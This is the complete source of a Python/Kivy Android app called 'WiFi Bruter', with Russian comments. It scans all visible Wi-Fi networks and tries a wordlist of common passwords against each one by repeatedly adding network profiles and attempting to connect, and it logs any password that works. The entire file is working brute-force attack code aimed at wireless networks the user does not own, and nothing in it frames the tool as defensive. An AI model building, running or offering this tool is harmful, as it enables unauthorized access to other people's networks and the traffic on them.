import os
import time
import threading
from kivy.app import App
from kivy.lang import Builder
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import mainthread
from kivy.utils import platform

# --- Запрос разрешений для Android ---
# Этот блок кода должен быть выполнен до импорта pyjnius
if platform == 'android':
    from android.permissions import request_permissions, Permission
    request_permissions([
        Permission.ACCESS_FINE_LOCATION,
        Permission.ACCESS_COARSE_LOCATION,
        Permission.ACCESS_WIFI_STATE,
        Permission.CHANGE_WIFI_STATE
    ])
    from jnius import autoclass

# Главный класс приложения
class MainLayout(BoxLayout):
    pass

class WifiBruterApp(App):
    def build(self):
        self.title = "WiFi Bruter"
        # Загружаем UI из .kv файла
        self.layout = Builder.load_file('wifibruter.kv')
        self.is_running = False # Флаг для остановки процесса
        return self.layout

    def start_brute_force(self):
        """Запускает процесс подбора в отдельном потоке."""
        if self.is_running:
            self.log_message("Процесс уже запущен.")
            return

        self.is_running = True
        self.log_message("[СТАРТ] Начинаю проверку...")
        # Запускаем тяжелую задачу в потоке, чтобы не блокировать UI
        threading.Thread(target=self.run_attack_thread, daemon=True).start()

    def stop_brute_force(self):
        """Останавливает процесс подбора."""
        if not self.is_running:
            self.log_message("Процесс не был запущен.")
            return

        self.is_running = False
        self.log_message("[СТОП] Процесс будет остановлен после текущей попытки.")

    @mainthread
    def log_message(self, message):
        """Безопасно добавляет сообщение в лог из любого потока."""
        self.layout.ids.log_output.text += f"{message}\n"

    def run_attack_thread(self):
        """Основная логика, выполняемая в фоновом потоке."""
        # 1. Настройка и чтение паролей
        passwords = self.setup_passwords()
        if not passwords:
            self.log_message("[ОШИБКА] Файл с паролями не найден или пуст.")
            self.is_running = False
            return

        # 2. Сканирование сетей
        self.log_message("Идет сканирование Wi-Fi сетей...")
        available_networks = self.android_scan_wifi()
        if not available_networks:
            self.log_message("Доступные Wi-Fi сети не найдены.")
            self.is_running = False
            return
        
        self.log_message("Найденные сети: " + ", ".join(available_networks))

        # 3. Основной цикл подбора
        success_found = False
        for ssid in available_networks:
            if not self.is_running: break # Проверка флага остановки
            for password in passwords:
                if not self.is_running: break # Проверка флага остановки
                
                password = password.strip()
                if not password: continue

                self.log_message(f"-> Сеть: '{ssid}', Пароль: '{password}'")
                
                if self.android_connect_to_wifi(ssid, password):
                    self.log_message(f"[УСПЕХ!] Пароль '{password}' подошел к сети '{ssid}'!")
                    success_found = True
                    # Можно раскомментировать, если нужно остановиться после первого успеха
                    # self.is_running = False
                    break # Переходим к следующей сети
                else:
                    self.log_message("    ...неверный пароль.")
        
        if not success_found:
            self.log_message("[ЗАВЕРШЕНО] Не удалось подобрать пароль ни к одной сети.")
        else:
            self.log_message("[ЗАВЕРШЕНО] Проверка окончена.")
            
        self.is_running = False

    def setup_passwords(self):
        """Создает и/или читает файл с паролями."""
        passwords_list = []
        # Получаем путь к приватной директории приложения
        app_dir = App.get_running_app().user_data_dir
        passwords_file = os.path.join(app_dir, "Pass.txt")

        if not os.path.exists(passwords_file):
            self.log_message(f"Создаю файл паролей: {passwords_file}")
            default_passwords = "12345678\n87654321\n11111111\n00000000\nqwerty123"
            with open(passwords_file, 'w') as f:
                f.write(default_passwords)
        
        with open(passwords_file, 'r') as f:
            passwords_list = f.readlines()
        
        return passwords_list

    def android_scan_wifi(self):
        """Сканирует Wi-Fi на Android. Возвращает список SSID."""
        if platform != 'android': return ["FakeNet1", "FakeNet2_test"]

        # Получаем доступ к WifiManager
        Context = autoclass('android.content.Context')
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        wifi_manager = PythonActivity.mActivity.getSystemService(Context.WIFI_SERVICE)
        
        # Результаты могут быть из кэша, но для простоты этого достаточно
        scan_results_java = wifi_manager.getScanResults()
        
        ssids = []
        for network in scan_results_java:
            if network.SSID:
                ssids.append(network.SSID)
        return list(set(ssids)) # Возвращаем уникальные имена

    def android_connect_to_wifi(self, ssid, password):
        """Подключается к Wi-Fi на Android. Возвращает True/False."""
        if platform != 'android':
            return password == "12345678" and ssid == "FakeNet1"

        Context = autoclass('android.content.Context')
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        wifi_manager = PythonActivity.mActivity.getSystemService(Context.WIFI_SERVICE)

        # Создаем конфигурацию сети
        WifiConfiguration = autoclass('android.net.wifi.WifiConfiguration')
        config = WifiConfiguration()
        config.SSID = f'"{ssid}"'  # SSID должен быть в кавычках
        config.preSharedKey = f'"{password}"' # Пароль тоже

        # Добавляем сеть и получаем ее ID
        net_id = wifi_manager.addNetwork(config)
        if net_id == -1: return False # Не удалось добавить сеть

        # Подключаемся
        wifi_manager.disconnect()
        wifi_manager.enableNetwork(net_id, True)
        wifi_manager.reconnect()
        
        # Даем время на подключение. В реальном приложении здесь
        # нужен BroadcastReceiver, но для простоты используем sleep.
        time.sleep(7)

        # Проверяем, удалось ли подключиться
        connection_info = wifi_manager.getConnectionInfo()
        if connection_info and connection_info.getSSID() == f'"{ssid}"':
            return True
        
        # Если не удалось, удаляем созданный профиль сети
        wifi_manager.removeNetwork(net_id)
        return False

if __name__ == '__main__':
    WifiBruterApp().run()